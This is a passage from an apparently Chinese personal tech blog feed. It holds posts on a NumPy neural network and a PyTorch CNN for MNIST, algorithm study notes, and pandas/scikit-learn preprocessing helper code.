class="hljs-built_in">sum</span>(log_likelihood) / m<br>    <span class="hljs-keyword">return</span> loss<br></code></pre></td></tr></table></figure><p>pytorch则直接使用log_softmax + NLLLoss作为损失函数。</p><h2 id="后向传播">后向传播</h2><p>通过梯度下降结合学习率更新值。 <span class="math display">\[x&#39; = x - \alpha \frac{dy}{dx}\]</span></p><p>示意图：</p><p><img src="/images/backward.png" alt="后向传播示意图" style="zoom:50%;" /></p><p>公式证明:</p><p><img src="/images/provement.png" alt="后向传播公式证明" style="zoom:67%;" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">single_layer_backward_propagation</span>(<span class="hljs-params">dA_curr, W_curr, b_curr, Z_curr, A_prev, activation=<span class="hljs-string">&quot;relu&quot;</span></span>):<br><br>    m = A_prev.shape[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># dC/dA -&gt; DC/dZ</span><br>    <span class="hljs-keyword">if</span> activation == <span class="hljs-string">&quot;relu&quot;</span>:<br>        backward_activation_func = relu_backward<br>    <span class="hljs-keyword">elif</span> activation == <span class="hljs-string">&quot;sigmoid&quot;</span>:<br>        backward_activation_func = sigmoid_backward<br>    <span class="hljs-keyword">elif</span> activation == <span class="hljs-string">&quot;softmax&quot;</span>:<br>        backward_activation_func = softmax_backward<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Non-supported activation function&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> (activation == <span class="hljs-string">&quot;softmax&quot;</span>):<br>        dZ_curr = dA_curr<br>    <span class="hljs-keyword">else</span>:<br>        dZ_curr = backward_activation_func(dA_curr, Z_curr)<br>        <br>    <span class="hljs-comment"># 计算dw</span><br>    dW_curr = np.dot(dZ_curr, A_prev.T) / m<br>    <span class="hljs-comment"># 作为下一轮的dC/dA</span><br>    db_curr = np.<span class="hljs-built_in">sum</span>(dZ_curr, axis=<span class="hljs-number">1</span>, keepdims=<span class="hljs-literal">True</span>) / m<br>    <span class="hljs-comment"># derivative of the matrix A_prev</span><br>    dA_prev = np.dot(W_curr.T, dZ_curr)<br><br>    <span class="hljs-keyword">return</span> dA_prev, dW_curr, db_curr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">full_backward_propagation</span>(<span class="hljs-params">Y_hat, Y, memory, params_values, nn_architecture</span>):<br>    grads_values = &#123;&#125;<br><br>    m = Y.shape[<span class="hljs-number">0</span>]<br><br>    dA_prev = softmax_backward(Y_hat, Y)<br>    <br>    <span class="hljs-keyword">for</span> layer_idx_prev, layer <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">enumerate</span>(nn_architecture))):<br>        layer_idx_curr = layer_idx_prev + <span class="hljs-number">1</span><br><br>        activ_function_curr = layer[<span class="hljs-string">&quot;activation&quot;</span>]<br>        <br>        dA_curr = dA_prev<br>        <br>        <span class="hljs-comment"># 上一轮的A</span><br>        A_prev = memory[<span class="hljs-string">&quot;A&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx_prev)]<br>        Z_curr = memory[<span class="hljs-string">&quot;Z&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx_curr)]<br>        <br>        W_curr = params_values[<span class="hljs-string">&quot;W&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx_curr)]<br>        b_curr = params_values[<span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx_curr)]<br>        <br>        dA_prev, dW_curr, db_curr = single_layer_backward_propagation(<br>            dA_curr, W_curr, b_curr, Z_curr, A_prev, activ_function_curr)<br>        <br>        <span class="hljs-comment"># 保留对应的梯度值</span><br>        grads_values[<span class="hljs-string">&quot;dW&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx_curr)] = dW_curr<br>        grads_values[<span class="hljs-string">&quot;db&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx_curr)] = db_curr<br>    <br>    <span class="hljs-keyword">return</span> grads_values<br></code></pre></td></tr></table></figure><h2 id="训练方式">训练方式</h2><p>使用mini-batch训练，batchsize选择128，较SGD时间复杂度较小，较batch训练增加了randomshuffle，且多组训练，有助于寻找全局最优。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(epochs):<br>    p = np.random.permutation(train_label.shape[<span class="hljs-number">0</span>])<br>    train_data= train_data.T[p].T<br>    train_label = train_label[p]<br>    start = <span class="hljs-number">0</span><br>    batch = <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> (start &lt; train_data.shape[<span class="hljs-number">1</span>]):<br>        <span class="hljs-comment">#...</span><br>        start += batch<br><br></code></pre></td></tr></table></figure><h1 id="训练mnist数据集">训练Mnist数据集</h1><figure><img src="/images/image-20220502212039924.png" alt="训练测试曲线" /><figcaption aria-hidden="true">训练测试曲线</figcaption></figure><table><thead><tr class="header"><th>size</th><th>train accuracy</th><th>test accuracy</th></tr></thead><tbody><tr class="odd"><td>512x512x10</td><td>0.94</td><td>0.88</td></tr><tr class="even"><td>500x150x10</td><td>0.90</td><td>0.87</td></tr><tr class="odd"><td>30x10</td><td>0.86</td><td>0.83</td></tr></tbody></table><p>可以看出使用512x512x10的网络训练集与测试集的准确率相差较大，体现出过拟合的特点，500x150x10表现也较为相近。而30x10的网络训练和测试误差都较大，可以体现出欠拟合的特点。但整体网络的效果较差，由于针对图像数据，将图像的每个像素作为features,并不能很好的体现图像的特点，而是用卷积神经网络可以解决这个问题。</p><h1 id="使用cnn模型">使用CNN模型</h1><p>参考<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="https://github.com/pytorch/examples/blob/main/mnist/main.py">[2]</span></a></sup>，通过pytorch快速建立CNN模型，并设置droupout正则化防止过拟合。CNN模型通过卷积核更直观的展现图像各个区域的特点，且起到了降维的作用，而后面的全连接层则可将前面通过卷积抽象出的特征进行分类训练，较上文直接使用像素作为特征更有意义，准确率也更高。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Net</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Net, self).__init__()<br>        self.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)<br>        self.conv2 = nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)<br>        self.dropout1 = nn.Dropout(<span class="hljs-number">0.25</span>)<br>        self.dropout2 = nn.Dropout(<span class="hljs-number">0.5</span>)<br>        self.fc1 = nn.Linear(<span class="hljs-number">9216</span>, <span class="hljs-number">128</span>)<br>        self.fc2 = nn.Linear(<span class="hljs-number">128</span>, <span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = self.conv1(x)<br>        x = F.relu(x)<br>        x = self.conv2(x)<br>        x = F.relu(x)<br>        x = F.max_pool2d(x, <span class="hljs-number">2</span>)<br>        x = self.dropout1(x)<br>        x = torch.flatten(x, <span class="hljs-number">1</span>)<br>        x = self.fc1(x)<br>        x = F.relu(x)<br>        x = self.dropout2(x)<br>        x = self.fc2(x)<br>        output = F.log_softmax(x, dim=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><figure><img src="/images/CNN%20result.png" alt="CNN训练结果" /><figcaption aria-hidden="true">CNN训练结果</figcaption></figure><p>可以看出，只经过一个epoch就在测试集达到了98准确率，体现了CNN网络解决图像识别问题的能力。</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span>https://towardsdatascience.com/lets-code-a-neural-network-in-plain-numpy-ae7e74410795<a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span>https://github.com/pytorch/examples/blob/main/mnist/main.py<a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>Machine Learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本算法思路</title>
    <link href="/2022/01/30/basic-al-md/"/>
    <url>/2022/01/30/basic-al-md/</url>
    
    <content type="html"><![CDATA[<h1 id="algorithm">algorithm</h1><h2 id="基本思路">基本思路</h2><p>广搜 猜想(重构问题)<br />深搜 推理(基于性质，选择工具)<br />启发式搜索根据当前推理的流程，但往往无法得到一个正确的全局函数（Intuition）</p><h2 id="数据结构">数据结构</h2><p>允许存在待处理的元素，添加一个标记位，最后再处理(懒更新)<br />其中包括线段树的懒更新，保存index的单调队列，存在冗余项的优先队列</p><h3 id="数组结构">数组结构</h3><ol type="1"><li><p>双向链表 + 哈希表<br />hashmap O(1) 寻址（！性能可能退化）<br />O(1)删除 链表<br />如: LRU / LFU</p></li><li><p>栈 | 双向队列<br />维护一个距离上的关联, 只能增加修改两侧元素<br />!对于弹出的元素，当前元素代表真正的解的位置，对于当前元素，栈内的元素代表解的空间<br />可用于递归调用的实现<br />用于运算符等涉及空间逻辑关系<br />在0－1BFS中双向队列可以完成最小路径的寻找</p></li><li><p>双指针<br />快慢指针可以判断链表的环<br />滑动窗口维护单调性<br />T-F问题 区间有唯一性</p></li><li><p>单调队列<br />可以logn寻址，但只能增加/修改元素，或只需要弹出一侧的元素<br />!对于弹出的元素，当前元素代表真正的解的位置，对于当前元素，栈内的元素代表解的空间<br />!解的单调性证明：逆向考虑，若解中存在递减元素，则一定不符合条件，因此队列递增<br />若弹出条件是否等于，确定弹出元素的解是否为严格小于，而当前元素可以选择严格小于，也可以选择小于等于<br />在最大递增子串中可以用来更新维护贪心的状态</p><p>数据的变化具有单调性，只需要记录当前位置即可可以结合二分方便状态转移。</p></li><li><p>离散化区间</p></li></ol><h3 id="树类结构">树类结构</h3><ol type="1"><li>Set(红黑树)<br />可以O(logn)删除，O(logn）寻址<br />multiset 多个元素<br />难以进行区间处理<br />注意求指针距离的复杂度为O(n)， 不同于vector<br />出现区间选择，删除的时候，不一定要用线段树，红黑树可以在没有元素的时候节省时间复杂度。</li><li>堆 | 优先队列<br />O(logn)插入<br />堆无法寻址删除 但可以维护一个贪心状态<br />两个堆(对顶堆)可以维护一个中位数的值<br /></li><li>线段树<br />基于已有的区间范围，维护每个区间数值上的关系<br /></li><li>并查集<br />logn合并集合，但不能拆集合<br />通过排序，根据单调性合并，二维接雨水<br />带权值的路径压缩 / 也可以bfs 蓝桥杯 查询累和</li></ol><h2 id="数理性质">数理性质</h2><h3 id="数论">数论</h3><ol type="1"><li>组合相关<br />卢卡斯定理快速计算组合<br />生成next permulation<br />C(n, m) = C(不包含当前元素) + C(包含当前元素) = C(n - 1, m) + C(n - 1, m- 1)<ol type="1"><li>累加求和，从杨辉三角可以看出，若C(n, m)中m不变，求和可以合并<br /></li><li>通过dp思想枚举最后一个元素, 防止元素重复<br /></li><li>经典组合模型,小球放入箱子的组合数问题,如存在一定需要放的无区别小球，考虑隔板法, 对于可放可不放的小球<br /></li></ol></li><li>因子类 对于乘法逆元，egcd gcd log(n)(欧拉 需要知道质因子个数) <spanclass="math inline">\(a^{p - 1}\)</span><br />对于同余问题，注意加减乘都不改变同余的特性, 整除运算会改变,其中组合数需要用到卢卡斯定理<br />对于提取公因子个数 nsqrt(n) 提取质因子nsqrt(n)<br />质因数分解中剩余项为质数</li></ol><h3 id="图">图</h3><ol type="1"><li>与直径相关的最长路问题</li><li>删边得到最小环</li></ol><h3 id="函数">函数</h3><ol type="1"><li>绝对值函数，<span class="math inline">\(|x - x_1| + |x - x_2| ... +|x - x_n|\)</span> 取中位数即可</li></ol><h3 id="几何">几何</h3><ol type="1"><li>求K值</li><li>凸包</li></ol><h3 id="数值计算">数值计算</h3><ol type="1"><li><p>快速乘/幂 乘法 - 指数</p></li><li><p>异或的性质 不具备分配律...</p></li></ol><h3 id="博弈论">博弈论</h3><ol type="1"><li>逐步贪心讨论必胜态 - 注意奇数偶数 记忆化搜索判断是否有必胜态</li></ol><h3 id="信息论">信息论</h3><ol type="1"><li>信息量 熵 设计实验</li><li>随机数的生成</li></ol><h2 id="算法">算法</h2><h3 id="重新组织问题">重新组织问题</h3><ol type="1"><li><p>数理等价</p><p>蚂蚁的相遇问题 - 改变身份<br />根据子集还原数组 - 每次删除施加影响的数值的集合<br />从Hash mask角度考虑</p><p>子序列内不存在频次超过n/2即可删...<br />证明必要/充分性 - 蓝桥杯青蛙跳</p></li><li><p>预处理/枚举</p><p>先考虑第一个或最后一个值或整体特性<br />确认一种顺序 （拓扑 数值...) 考虑</p><p>x, y选择较小的数，枚举值域 例题 Atcoder 蓝桥杯 分果果</p></li><li><p>生成数据结构 建图分析 前缀和分析 区间分析</p></li><li><p>逆向考虑<br />给定解 判断参数的范围 / 是否满足<br />(加密密码本匹配源码)</p></li><li><p>计算时间复杂度 <span class="math inline">\(\sum \frac{1}{n} \sim\log n\)</span> 实际的时间度较小</p></li></ol><h3 id="冗余懒更新">冗余/懒更新</h3><p>本质在于错开处理的时间，借助一些标记后面再处理。对于复杂计算，考虑先计算再回退 懒更新的思路 后面再解决</p><h3 id="二分">二分</h3><ol type="1"><li>f(x)的二元性<br /></li><li>边界的讨论</li></ol><h3 id="状态转移">状态转移</h3><p>基于一组最难满足的解</p><ol type="1"><li><p>转移思路<br />可以通过遍历增加限制，或多求几遍值<br />对存在单调条件，可以尝试多次或逆向更新<br />对不满足拓扑顺序,增加一个以当前元素结尾的条件，或预先进行一次拓扑排序<br />对环的处理 - 倍增数组，限定长度为n<br />对于重复数，合并反而减少了信息量（总长度有限制），单个元素的转移更加灵活，删与被删，不需计数<br />对于数据量少，考虑状态压缩，枚举子集，并判断转移的有效性<br />对于组合数，使用限定最后元素来定义dp，否则会重复计数,结合组合公式，优化DP<br />对涉及到多个主体的问题，需要设置步数/轮数，防止重复更新<br />对于涉及多个元素联系的问题，考虑枚举还没发生的状态</p></li><li><p>检验 | 优化<br />画出状态转移矩阵<br />最佳转移点是否离散或有单调性<br />重新排列合并公式 前缀和<br />转化为记忆化搜索剪枝</p></li><li><p>else<br />注意对遍历过而不能完成的状态 -1（未遍历） - INF（失败） 区分<br />可以使用map防止溢出</p></li></ol><h3 id="搜索">搜索</h3><ol type="1"><li>递归搜索 (dfs)<br />condition - receive - execution - return<br />搜索每个子状态 - 可以结合记忆化<br />汉诺塔拆分状态<br /></li><li>队列搜索<br />dijkstra 优先队列 以单调递增量作为距离即可<br />0-1 bfs有隐含条件<br /></li><li>基于DP的搜索<br />spfa floy...<br /></li><li>基于贪心简化循环<br />bit角度, ++ - lowbit(i)<br />几何性质, 考虑两条相邻直线的k值即可</li></ol><h2 id="经典问题">经典问题</h2><h3 id="字符串处理">字符串处理</h3><ol type="1"><li><p>子串匹配类</p><p>KMP hash trie 分隔符哈希...</p></li><li><p>回文</p></li></ol><h3 id="图树">图/树</h3><ol type="1"><li><p>距离类<br />聚点 - 源点 网络流 dijkstra spfa floy bfs dfs 剪枝<br />直径等 多次dfs</p></li><li><p>拓扑/分类<br />拓扑排序/染色<br />并查集</p></li><li><p>DP类</p><p>binary lifting LCA</p></li></ol><h3 id="区间">区间</h3><ol type="1"><li>数据结构+<br />优先队列 | 单调栈 | 双指针 | 线段树<br /></li><li>预处理<br />pre/suf计算<br /></li><li>区间DP</li></ol><h2 id="编程实现">编程实现</h2><h3 id="数据类型">数据类型</h3><ol type="1"><li>函数的返回值类型是int... 改为long long<br /></li><li>初始化，d[0] = 0 - d[s]<br /></li><li>位运算优先级低</li></ol><h3 id="逻辑顺序">逻辑顺序</h3><ol type="1"><li>提前break and continue 影响了后面的结果<br />cin / cout cur[k] = cur[k - 1]<br />dp同理需要注意 dp[k] = dp[k - 1]<br /></li><li>注意复用的值<br />链表的指向<br />! a[2] -= d 范围a[1] + a[2]</li></ol><h3 id="else">else</h3><ol type="1"><li>输入输出 ? break会影响cin<br /></li><li>数据逻辑，存在不属于链表中的点。<br /></li><li>auto in lambda 是c++14的特性 decltype<br /></li><li>trick assert 小数据暴搜 大数据优化 分开两个算法<br /></li><li>对空间、时间、数值范围的估计</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Algorithm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>preprocess</title>
    <link href="/2022/01/07/preprocess/"/>
    <url>/2022/01/07/preprocess/</url>
    
    <content type="html"><![CDATA[<h1 id="preprocess">Preprocess</h1><h2 id="read_file">read_file</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">base_path = os.path.abspath(__file__ + <span class="hljs-string">&quot;/../&quot;</span>)<br>path = os.path.join(base_path,<span class="hljs-string">&#x27;data&#x27;</span>)<br>train_path = os.path.join(path,<span class="hljs-string">&#x27;train.csv&#x27;</span>)<br>test_path = os.path.join(path,<span class="hljs-string">&#x27;test.csv&#x27;</span>)<br>result_path = os.path.join(path,<span class="hljs-string">&#x27;submission.csv&#x27;</span>)<br><br>train_df = pd.read_csv(train_path)    <br>test_df = pd.read_csv(test_path)    <br>result_df = pd.read_csv(result_path)   <br></code></pre></td></tr></table></figure><h2 id="头文件">头文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># basic</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># plot</span><br><span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns<br><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> gridspec<br><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># preprocess</span><br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> Normalizer<br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> PolynomialFeatures<br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> StandardScaler<br><br><span class="hljs-comment"># cross_validation</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> LeaveOneOut<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_validate<br><br><span class="hljs-comment"># models</span><br><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression<br><span class="hljs-keyword">from</span> sklearn.neural_network <span class="hljs-keyword">import</span> MLPClassifier<br><span class="hljs-keyword">from</span> sklearn.svm <span class="hljs-keyword">import</span> SVC<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> VotingClassifier<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><br><span class="hljs-comment"># estimate</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> validation_curve<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> learning_curve<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> confusion_matrix<br></code></pre></td></tr></table></figure><h2 id="随机数">随机数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_randn</span>(<span class="hljs-params">mean=<span class="hljs-number">0</span>, std=<span class="hljs-number">0</span>, max_val=np.inf, min_val=-np.inf</span>):<br>    num = std * np.random.randn() + mean<br>    <span class="hljs-keyword">if</span> num &gt; max_val:<br>        <span class="hljs-keyword">return</span> max_val<br>    <span class="hljs-keyword">elif</span> num &lt; min_val:<br>        <span class="hljs-keyword">return</span> min_val<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> num<br></code></pre></td></tr></table></figure><h2 id="log">log</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_log</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;param:&#x27;</span>)<br>    <br>    cur = []<br>    basic = <span class="hljs-string">&quot;Step &quot;</span><br>    len_key = <span class="hljs-built_in">len</span>(basic)<br>    key_ind = <span class="hljs-number">4</span><br>    <br>    <span class="hljs-keyword">for</span> log_str <span class="hljs-keyword">in</span> log[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(log_str[len_key]) == key_ind:<br>            cur.append(log_str)            <br>            key_ind -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> key_ind == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br>        <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join(cur[::-<span class="hljs-number">1</span>]))<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><h2 id="观察数据">观察数据</h2><h3 id="预设">预设</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib <span class="hljs-keyword">as</span> mpl<br>mpl.rcParams[<span class="hljs-string">&#x27;figure.dpi&#x27;</span>] = <span class="hljs-number">100</span><br>pd.set_option(<span class="hljs-string">&#x27;max_rows&#x27;</span>, <span class="hljs-number">100</span>)<br>pd.set_option(<span class="hljs-string">&quot;max_columns&quot;</span>, <span class="hljs-number">50</span>)<br>pd.set_option(<span class="hljs-string">&quot;expand_frame_repr&quot;</span>, <span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># global </span><br>max_score = <span class="hljs-number">0</span><br>log = []<br>np.random.seed(<span class="hljs-number">2</span>)<br>i = <span class="hljs-number">0</span><br>cat_df = train_df.copy()<br><br><span class="hljs-comment">#split</span><br>X_train,X_test,y_train,y_test = train_test_split(X,y)<br></code></pre></td></tr></table></figure><h3 id="分类">分类</h3><p>离散标签 连续数值 字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_basic</span>(<span class="hljs-params">df</span>):<br>    <span class="hljs-built_in">print</span>(df.columns)<br>    <span class="hljs-comment"># type and nums</span><br>    <span class="hljs-built_in">print</span>(df.info())<br>    <span class="hljs-comment"># unique of type</span><br>    <span class="hljs-built_in">print</span>(df.describe(include=<span class="hljs-string">&#x27;O&#x27;</span>))<br>    <span class="hljs-comment"># series -&gt; 增加25-75</span><br>    <span class="hljs-built_in">print</span>(df.describe())<br>    <br><span class="hljs-comment"># 分别查看每一列的数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat_columns</span>(<span class="hljs-params">df</span>):<br>    <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(df.columns):<br>        <span class="hljs-built_in">print</span>(df[column].head(<span class="hljs-number">5</span>))<br><br><span class="hljs-comment"># 查看相关系数矩阵</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat_cov</span>(<span class="hljs-params">df</span>):<br>    fig,ax = plt.subplots()<br>    matrix = df.corr()<br>    ax = sns.heatmap(matrix)<br>    plt.show()   <br></code></pre></td></tr></table></figure><h3 id="离散标签">离散标签</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 单个标签与结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_label_distributions</span>(<span class="hljs-params">df,labels,target</span>):<br>    length = <span class="hljs-built_in">int</span>(np.sqrt(<span class="hljs-built_in">len</span>(labels))) + <span class="hljs-number">1</span><br>    fig = plt.figure()<br>    grid = gridspec.GridSpec(length,length,fig)<br>    <span class="hljs-keyword">for</span> a_len <span class="hljs-keyword">in</span> 